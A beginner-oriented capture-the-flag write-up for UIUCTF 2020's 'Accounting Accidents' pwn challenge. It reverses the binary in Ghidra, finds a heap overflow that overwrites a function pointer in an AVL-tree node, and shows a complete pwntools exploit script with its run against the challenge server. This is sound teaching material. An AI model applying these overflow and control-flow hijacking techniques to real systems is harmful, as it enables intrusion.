---
title: "Accounting Accidents"
layout: post
author:
  - Fan Pu Zeng (fanpu)
categories:
  - Pwn
ctf: UIUCTF
year: 2020
---

UIUCTF20 was a really fun Animal Crossing themed CTF that ran from July 17-19 2020. While I have not played the game before, I knew somewhat what it was about from watching Youtubers play it. I know a few female friends who are really into the game, and it is also worth noting that this is one of the games where there seems to be more female players.

PPP came in third place, which went above my expectations as most people playing were relatively new and I am quite happy with the results. Now, on to the writeup (which you can also read from the [original post](https://fanpu.io/UIUCTF20-accounting-accidents-pwn-write-up))!

### Accounting Accidents
You can download the binary [here](https://github.com/sajjadium/CTFium/raw/master/UIUCTF/2020/Accounting_Accidents/accounting) (sha256sum: `fcdc3991bed89b8aa5b509c4b6e205967a1e0b9e3fd041547492ebb75202130f`). This writeup is targeted at beginners to pwn, where I will explain concepts more thoroughly and avoid making leaps in logic.

I did not look at the flavortext before solving this challenge, taking it as a hint only when I get stuck. I will take a similar approach for this writeup, where we will discover together what the binary is doing.

Let's first check the security attributes of the binary:

{% highlight bash %}
➜  accounting checksec accounting 
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
{% endhighlight %}

Interesting. It's unlikely to be a ROP challenge since there is a canary, and NX means no executing shellcode on the stack. Let's open up the binary in Ghidra and analyse it.

Next run file:
{% highlight bash %}
➜  accounting file accounting 
accounting: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=72ded94a52807f73d24ae7c72db8e29099a7bfc3, not stripped
{% endhighlight %}

Awesome, it is not stripped. That should make reversing it a little easier.

### Running
When you run the binary, there is a bunch of text that is printed out character by character. Isabelle then asks us for the name of an item, and then the cost of 4 other items. Afterwards, she puts the item through her accounting software, and outputs the results. It categorizes things into left and right. No idea what that means for now.

{% highlight raw %}
{% raw %}
[NookAccounting]: Booting up Fancy Laser Accounting Generator (F.L.A.G.) at {0x8048878}
[NookAccounting]: Added "Apples" with cost of 10 bells to accounting spreadsheet.
[NookAccounting]: Added "Fancy Seashells" with cost of 20 bells to accounting spreadsheet.
[NookAccounting]: Added "Tom Nook Shirts" with cost of 30 bells to accounting spreadsheet.
[NookAccounting]: Added "Airplane Ticket" with cost of 40 bells to accounting spreadsheet.
[NookAccounting]: Added "ATM Repairs" with cost of 50 bells to accounting spreadsheet.
[Isabelle]: Oh no! I cant seem to find what this item is, but it cost 25 bells, what is it?
Item: %x %x %x AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa
[Isabelle]: Ohmygosh! Thank you for remembering! Now I can get back to work!
[NookAccounting]: Added "%x %x %x AAAAAA" with cost of 25 bells to accounting spreadsheet.

[Isabelle]: Ohmyheck! I dont know how much "Shrub Trimming" costs. Can you tell me?
Shrub Trimming Cost: 1
[NookAccounting]: Added "Shrub Trimming" with cost of 1 bells to accounting spreadsheet.


[Isabelle]: Thank you so much! You're the best, I added it to the accounting system now
[Isabelle]: Ohmyheck! I dont know how much "Raymond Hush $$" costs. Can you tell me?
Raymond Hush $$ Cost: -1
[NookAccounting]: Added "Raymond Hush $$" with cost of -1 bells to accounting spreadsheet.


[Isabelle]: Thank you so much! You're the best, I added it to the accounting system now
[Isabelle]: Ohmyheck! I dont know how much "Town Hall Food" costs. Can you tell me?
Town Hall Food Cost: 0
[NookAccounting]: Added "Town Hall Food" with cost of 0 bells to accounting spreadsheet.


[Isabelle]: Thank you so much! You're the best, I added it to the accounting system now
[Isabelle]: Ohmyheck! I dont know how much "New Wall Art" costs. Can you tell me?
New Wall Art Cost: 1


[Isabelle]: Thank you so much! You're the best, I added it to the accounting system now
[Isabelle]: Okay thank you so much! I'll run the accounting software at address 0x80487a6

===Nook(TM) Accounting Very Large Software V 10.49185.2a===
-=Left=-
Shrub Trimming: 1
Raymond Hush $$: -1
-=Right=-
Airplane Ticket: 40
ATM Repairs: 50
============================================
{% endraw %}
{% endhighlight %}

We get a leak for the `.text` section (which is honestly pointless since there is no PIE), and if we look at the source afterwards the address actually corresponds to the `print_flag` function that basically does what it says. I also tried fuzzing it with large inputs to see if it causes a segfault, followed by testing "%x" for format string vulnerability. None of those worked, so let's get to reversing.

### Reversing
Opening the file in Ghidra, we get the following `main` function:

{% highlight C linenos %}
{% raw %}
undefined4 main(void)
{
  undefined4 uVar1;
  int iVar2;
  int in_GS_OFFSET;
  int local_13c;
  int local_138;
  char *local_12c [4];
  char local_11c [8];
  char local_114 [256];
  int local_14;
  undefined *local_10;
  
  local_10 = &stack0x00000004;
  local_14 = *(int *)(in_GS_OFFSET + 0x14);
  printf("[NookAccounting]: Booting up Fancy Laser Accounting Generator (F.L.A.G.) at {%p}\n",
         print_flag);
  uVar1 = insert(0,10,"Apples");
  uVar1 = insert(uVar1,0x14,"Fancy Seashells");
  uVar1 = insert(uVar1,0x1e,"Tom Nook Shirts");
  uVar1 = insert(uVar1,0x28,"Airplane Ticket");
  uVar1 = insert(uVar1,0x32,"ATM Repairs");
  local_13c = insert(uVar1,0x19,0);
  putchar(10);
  local_12c[0] = "Shrub Trimming";
  local_12c[1] = "Raymond Hush $$";
  local_12c[2] = "Town Hall Food";
  local_12c[3] = "New Wall Art";
  local_138 = 0;
  while (local_138 < 4) {
    sprintf(local_114,
            "[Isabelle]: Ohmyheck! I dont know how much \"%s\" costs. Can you tell me?\n%s Cost: ",
            local_12c[local_138],local_12c[local_138]);
    fancy_print(local_114);
    fflush(stdout);
    memset(local_11c,0,8);
    read(0,local_11c,8);
    iVar2 = atoi(local_11c);
    local_13c = insert(local_13c,iVar2,local_12c[local_138]);
    putchar(10);
    fancy_print(
               "\n[Isabelle]: Thank you so much! You\'re the best, I added it to the accountingsystem now\n"
               );
    local_138 = local_138 + 1;
  }
  sprintf(local_114,
          "[Isabelle]: Okay thank you so much! I\'ll run the accounting software at address %p\n",
          *(undefined4 *)(local_13c + 0x20));
  fancy_print(local_114);
  (**(code **)(local_13c + 0x20))(local_13c);
  putchar(10);
  uVar1 = 0;
  if (local_14 != *(int *)(in_GS_OFFSET + 0x14)) {
    uVar1 = __stack_chk_fail_local();
  }
  return uVar1;
}
{% endraw %}
{% endhighlight %}

The print statements pretty up matches to what we saw when running the program. We also see a `read` in line 37, but it reads in 8 bytes into a buffer of 8 bytes, so there is no overflow for this. `fancy_print` is what probably prints the buffer character-by-character, so I did not bother reversing it. I thought it was annoying at first, but then I remembered the Animal Crossing theme, so afterwards I thought it was cute.

The most interesting part is in line 50, where we see a function pointer being called: `(**(code **)(local_13c + 0x20))(local_13c);`. `local_13c` is probably a struct of some sort, and has a function pointer at offset 0x20. It passes itself as an argument to the function.

Let's take a look at insert:

{% highlight C linenos %}
{% raw %}
int * insert(int *param_1,int param_2,undefined4 param_3)

{
  int iVar1;
  undefined4 uVar2;
  undefined4 uVar3;
  
  __x86.get_pc_thunk.ax();
  if (param_1 == (int *)0x0) {
    param_1 = (int *)newNode(param_2,param_3);
  }
  else {
    if (param_2 < *param_1) {
      iVar1 = insert(param_1[1],param_2,param_3);
      param_1[1] = iVar1;
    }
    else {
      if (param_2 <= *param_1) {
        return param_1;
      }
      iVar1 = insert(param_1[2],param_2,param_3);
      param_1[2] = iVar1;
    }
    uVar2 = height(param_1[2]);
    uVar3 = height(param_1[1]);
    iVar1 = max(uVar3,uVar2);
    param_1[3] = iVar1 + 1;
    iVar1 = getBalance(param_1);
    if ((iVar1 < 2) || (*(int *)param_1[1] <= param_2)) {
      if ((iVar1 < -1) && (*(int *)param_1[2] < param_2)) {
        param_1 = (int *)leftRotate(param_1);
      }
      else {
        if ((iVar1 < 2) || (param_2 <= *(int *)param_1[1])) {
          if ((iVar1 < -1) && (param_2 < *(int *)param_1[2])) {
            iVar1 = rightRotate(param_1[2]);
            param_1[2] = iVar1;
            param_1 = (int *)leftRotate(param_1);
          }
        }
        else {
          iVar1 = leftRotate(param_1[1]);
          param_1[1] = iVar1;
          param_1 = (int *)rightRotate(param_1);
        }
      }
    }
    else {
      param_1 = (int *)rightRotate(param_1);
    }
  }
  return param_1;
}
{% endraw %}
{% endhighlight %}

We see the functions `newNode`, `getBalance`, `leftRotate`, and `rightRotate` being used. From our foundational CS classes we know that rotations is a term used to describe the process of balancing binary trees, and `newNode` confirms this suspicion. Furthermore, the `left` and `right` we saw previously makes more sense in the context of trees.

Let's look at `newNode`:

{% highlight C linenos %}
{% raw %}
undefined4 * newNode(undefined4 param_1,char *param_2)

{
  size_t __n;
  undefined4 *puVar1;
  int in_GS_OFFSET;
  char local_110 [256];
  int local_10;
  
  local_10 = *(int *)(in_GS_OFFSET + 0x14);
  puVar1 = (undefined4 *)malloc(0x24);
  *puVar1 = param_1;
  puVar1[1] = 0;
  puVar1[2] = 0;
  puVar1[3] = 1;
  puVar1[8] = 0x80487a6;
  if (param_2 == (char *)0x0) {
    sprintf(local_110,
                        
            "[Isabelle]: Oh no! I cant seem to find what this item is, but it cost %d bells, whatis it?\nItem: "
            ,param_1);
    fancy_print(local_110);
    fflush(stdout);
    memset(puVar1 + 4,0,0x10);
    fgets((char *)(puVar1 + 4),0x15,stdin);
    *(undefined *)((int)puVar1 + 0x1f) = 0;
    fancy_print("[Isabelle]: Ohmygosh! Thank you for remembering! Now I can get back to work!\n");
  }
  else {
    __n = strlen(param_2);
    strncpy((char *)(puVar1 + 4),param_2,__n);
  }
  fflush(stdout);
  printf("[NookAccounting]: Added \"%s\" with cost of %d bells to accounting spreadsheet.\n",
         puVar1 + 4,*puVar1);
  usleep(100000);
  if (local_10 != *(int *)(in_GS_OFFSET + 0x14)) {
    puVar1 = (undefined4 *)__stack_chk_fail_local();
  }
  return puVar1;
}
{% endraw %}
{% endhighlight %}

We see that `puVar` is returned from malloc, and afterwards we are setting values to array indices of it. This pattern strongly indicates that `puVar1` is a struct with fields which are a multiple of 4 bytes (since Ghidra detected that `puVar1` is a `undefined4 *`), and that we are setting the fields in the struct.

`0x80487a6` looks like a pointer. If we go to the address in the disassembly, we end up precisely at the `print_edges` function, which looks like follows: 

{% highlight C linenos %}
{% raw %}
void print_edges(int param_1)

{
  undefined4 *local_10;
  
  puts("\n===Nook(TM) Accounting Very Large Software V 10.49185.2a===");
  local_10 = *(undefined4 **)(param_1 + 4);
  puts("-=Left=-");
  while (local_10 != (undefined4 *)0x0) {
    printf("%s: %d\n",local_10 + 4,*local_10);
    local_10 = (undefined4 *)local_10[1];
  }
  puts("-=Right=-");
  local_10 = *(undefined4 **)(param_1 + 8);
  while (local_10 != (undefined4 *)0x0) {
    printf("%s: %d\n",local_10 + 4,*local_10);
    local_10 = (undefined4 *)local_10[2];
  }
  puts("============================================");
  return;
}
{% endraw %}
{% endhighlight %}

That was what we saw previously at the end when running the program. Also, recall that line 50 in main was calling a function at offset 0x20, while the pointer is being set at offset 8 * 4 = 32 = 0x20 as well, so we can confirm that this function pointer is what is being called at the end. If we could overwrite the function pointer, we have EIP control!

### Finding the Vulnerability

Now back to the disassembly of `newNode`. We see a `fgets` being performed in line 25. It is writing to `puVar1 + 4`, and since `puVar1` is a pointer to a 4 byte type, this is a 4 * 4 = 16 bytes offset. So we can read up to 0x15 bytes to `&puVar[4]`. However, we only need 0x10 bytes to reach `&puVar[8]`, and then we have another 5 bytes overflow which is more than enough to overwrite the function pointer! 

Now that we have a buffer overflow vulnerability in hand and we can control EIP, let's see if there are already good existing targets to jump too. We recall that we have the `print_flag` function to use. Awesome!

### Developing the Exploit
We see that the vulnerable code path only gets executed in `newNode` when `param_2` is NULL. If we trace the code from the caller in main, this corresponds to the third argument for `insert`, and it is only in line 23 of `main` where it is set to NULL: `local_13c = insert(uVar1,0x19,0);`. This means we only get to overwrite the function pointer of one node that has the second parameter (which turns out to be the price) as 0x19, or 25.

Also, knowing that the data structure is most likely that of a tree, the disassembly of setting `uVar1` again and again makes sense now. `uVar1` is basically the root of the tree, and when we insert a node into a tree, we are getting the new root back each time. Then, the function pointer of the last node to be the root is called.

I tried to see if we can get lucky by just exploiting the overflow and seeing if the node that has the overflow ended up as the eventual root, but it did not work, as expected.

I then began annotating the `insert` function, to try to figure out the structure of the tree and see whether that gives us any insights:

{% highlight C linenos %}
{% raw %}
node * insert(node *node,int price,char *item_name)

{
  node *child_node;
  undefined4 child_node_;
  undefined4 left_height;
  int max_child_height;
  
  __x86.get_pc_thunk.ax();
  if (node == (node *)0x0) {
    node = (node *)newNode(price,item_name);
  }
  else {
    if (price < node->price) {
      child_node = (node *)insert((node *)node->left,price,item_name);
      *(node **)&node->left = child_node;
    }
    else {
                    /* if price == node->price */
      if (price <= node->price) {
        return node;
      }
      child_node_ = insert((node *)node->right,price,item_name);
      node->right = child_node_;
    }
                    /* variable got repurposed here as an int, since they have the same size */
    child_node_ = height(node->right);
    left_height = height(node->left);
    max_child_height = max(left_height,child_node_);
    node->height = max_child_height + 1;
		   /* The register from max_child_height was reused here, so while I wish I could have
		    * been able to rename this to something more appropriate like "height_diff",
		    * I am stuck with this. If anyone knows of a way to rename this in Ghidra
		    * please do let me know in the comments! */
    max_child_height = getBalance(node);
    if ((max_child_height < 2) || (*(int *)node->left <= price)) {
      if ((max_child_height < -1) && (*(int *)node->right < price)) {
        node = (node *)leftRotate(node);
      }
      else {
        if ((max_child_height < 2) || (price <= *(int *)node->left)) {
          if ((max_child_height < -1) && (price < *(int *)node->right)) {
            child_node_ = rightRotate(node->right);
            node->right = child_node_;
            node = (node *)leftRotate(node);
          }
        }
        else {
          child_node_ = leftRotate(node->left);
          node->left = child_node_;
          node = (node *)rightRotate(node);
        }
      }
    }
    else {
      node = (node *)rightRotate(node);
    }
  }
  return node;
}
{% endraw %}
{% endhighlight %}

The tree is being sorted by price. `getBalance` returns the difference in height between the left and right child. `leftRotate` and `rightRotate` was a bit involved and I did not bother reversing them, as it is probably what it says it does.

While doing so, I also reversed the structure of the node, with the offsets and datatypes given below:

![Reversed node struct](/images/writeups/accounting_accident_node_struct.png)

The fields are as we would expect.

### Possibly an AVL tree?
If we look at the code, we see that a rotation (either left or right) is done when the absolute difference between the heights of the subtrees exceeds 1. This brings back memories from our intro CS class, which introduced the AVL tree that has the property that the "heights of the two child subtrees of any node differ by at most one; if at any time they differ by more than one, rebalancing is done to restore this property". So we are most likely looking at an AVL tree!

Let's confirm our suspicions, and see the output of the program when we insert nodes of a particular value. Before we do that, let's reverse `print_edges` so we know what exactly is being printed:

{% highlight C linenos %}
{% raw %}
void print_edges(node *node)
{
  node *n;
  
  puts("\n===Nook(TM) Accounting Very Large Software V 10.49185.2a===");
  n = (node *)node->left;
  puts("-=Left=-");
  while (n != (node *)0x0) {
    printf("%s: %d\n",n->name,n->price);
    n = (node *)n->left;
  }
  puts("-=Right=-");
  n = (node *)node->right;
  while (n != (node *)0x0) {
    printf("%s: %d\n",n->name,n->price);
    n = (node *)n->right;
  }
  puts("============================================");
  return;
}
{% endraw %}
{% endhighlight %}

So the `left` section just keeps traversing down and printing the left children, while the `right` section does the opposite. Cool!

Initially, the program inserts nodes with prices [10, 20, 30, 40, 50, 25] into the tree. Let's run the program again, and use inputs [1, 2, 3, 4] for the prices, which are inserted after.

{% highlight C linenos %}
{% raw %}
===Nook(TM) Accounting Very Large Software V 10.49185.2a===
-=Left=-
Raymond Hush $$: 2
Shrub Trimming: 1
-=Right=-
Tom Nook Shirts: 30
Airplane Ticket: 40
ATM Repairs: 50
{% endraw %}
{% endhighlight %}

I then inserted the same nodes in order to [VisuAlgo](https://visualgo.net/bn/bst) (click on the AVL tree button on the header), which is a great website for visualizing algorithms and data structures. 

![AVL tree after insertion](/images/writeups/accounting_accident_avl_2.png)

We see that the above picture has 2 and 1 when taking only left subtrees, and 30, 40, and 50 when only taking the right subtrees, just as what was being output by the binary. Nice!

So now, our final challenge is to insert four nodes such that the node with our payload that has value 0x19=25 ends up at the root.

The tree initially before any of our custom nodes are inserted looks like the following:

![AVL tree after insertion, 1](/images/writeups/accounting_accident_avl_3.png)

For 25 to be the root, intuition tells us that we need to make the left part of the tree heavier and eventually force node 25 to bubble up. The way we'll do this, however, is not so intuitive. We first want to force 25 to make a rotation upwards. This can be done by giving it more children. We insert nodes with values 26 and 27:

![AVL tree after insertion, 2](/images/writeups/accounting_accident_avl_4.png)

"WHATTT?!", I hear you say. Did we just make things worse, since node 25 is in an even lower position now?

This is the unintuitive part, because what we were really doing is to give some nodes to the right subtree of 20. Now, we insert node 21, which forces the node at 20 to undergo a rotation:

![AVL tree after insertion, 3](/images/writeups/accounting_accident_avl_5.png)


Now we have node 25 at a rather sweet spot. Finally, let's cause a rotation at 30 by causing one of its child to increase in height. We can grow the height of the subtree rooted at 20 by either adding something less than 10, or something between 21 or 25. Let's go with adding 22:

![AVL tree after insertion, 4](/images/writeups/accounting_accident_avl_6.png)

We did it!

### Full Exploit
The full exploit script is given below:

{% highlight C linenos %}
{% raw %}
#!/usr/bin/env python3
from pwn import *

elf = ELF("./accounting")

context.binary = elf
context.terminal = ['kitty', '-e', 'sh', '-c']

if args.REMOTE:
    conn = remote("chal.uiuc.tf", 2001)
else:
    conn = process([elf.path])

def main():
    # Note that each of the recv steps can take a while to run,
    # because of the fancy printing. It is not frozen!
    print(conn.recvuntil("{"))
    leak = conn.recvuntil("}")[:-1]

    # Leak print_flag address
    flag_addr = int(leak, 16)
    print("print_flag address: ", hex(flag_addr))

    # Overflow exploit
    print(conn.recvuntil("Item: "))
    exp = b"A"*0x10
    exp += p32(flag_addr)
    conn.sendline(exp)

    # First price input
    print(conn.recvuntil("Shrub Trimming Cost: "))
    conn.sendline('26')

    # Second price input
    print(conn.recvuntil("Raymond Hush $$ Cost: "))
    conn.sendline('27')

    # Third price input
    print(conn.recvuntil("Town Hall Food Cost: "))
    conn.sendline('21')

    # Last price input
    print(conn.recvuntil("New Wall Art Cost: "))
    conn.sendline('22')
    
    conn.interactive()

if __name__ == "__main__":
    main()
{% endraw %}
{% endhighlight %}


Running the exploit script against the challenge server:
{% highlight text %}
{% raw %}
➜  accounting python solve.py REMOTE
[+] Opening connection to chal.uiuc.tf on port 2001: Done
b'[NookAccounting]: Booting up Fancy Laser Accounting Generator (F.L.A.G.) at {'
print_flag address:  0x8048878
b'\n[NookAccounting]: Added "Apples" with cost of 10 bells to accounting spreadsheet.\n[NookAccounting]: Added "Fancy Seashells" with cost of 20 bells to accounting spreadsheet.\n[NookAccounting]: Added "Tom Nook Shirts" with cost of 30 bells to accounting spreadsheet.\n[NookAccounting]: Added "Airplane Ticket" with cost of 40 bells to accounting spreadsheet.\n[NookAccounting]: Added "ATM Repairs" with cost of 50 bells to accounting spreadsheet.\n[Isabelle]: Oh no! I cant seem to find what this item is, but it cost 25 bells, what is it?\nItem: '
b'[Isabelle]: Ohmygosh! Thank you for remembering! Now I can get back to work!\n[NookAccounting]: Added "AAAAAAAAAAAAAAA" with cost of 25 bells to accounting spreadsheet.\n\n[Isabelle]: Ohmyheck! I dont know how much "Shrub Trimming" costs. Can you tell me?\nShrub Trimming Cost: '
b'[NookAccounting]: Added "Shrub Trimming" with cost of 26 bells to accounting spreadsheet.\n\n\n[Isabelle]: Thank you so much! You\'re the best, I added it to the accounting system now\n[Isabelle]: Ohmyheck! I dont know how much "Raymond Hush $$" costs. Can you tell me?\nRaymond Hush $$ Cost: '
b'[NookAccounting]: Added "Raymond Hush $$" with cost of 27 bells to accounting spreadsheet.\n\n\n[Isabelle]: Thank you so much! You\'re the best, I added it to the accounting system now\n[Isabelle]: Ohmyheck! I dont know how much "Town Hall Food" costs. Can you tell me?\nTown Hall Food Cost: '
b'[NookAccounting]: Added "Town Hall Food" with cost of 21 bells to accounting spreadsheet.\n\n\n[Isabelle]: Thank you so much! You\'re the best, I added it to the accounting system now\n[Isabelle]: Ohmyheck! I dont know how much "New Wall Art" costs. Can you tell me?\nNew Wall Art Cost: '
[*] Switching to interactive mode
[NookAccounting]: Added "New Wall Art" with cost of 22 bells to accounting spreadsheet.


[Isabelle]: Thank you so much! You're the best, I added it to the accounting system now
[Isabelle]: Okay thank you so much! I'll run the accounting software at address 0x8048878
uiuctf{1s@beLl3_do3sNt_r3@l1y_d0_MuCh_!n_aCnH}
{% endraw %}
{% endhighlight %}

And just like that we get our flag!

### Flavortext
{% highlight text %}
Isabelle is working on billing sheets for the end of the month, and she needs to move things into her Accounting Very Large accounting system. Can you help her finish her billing?!
{% endhighlight %}
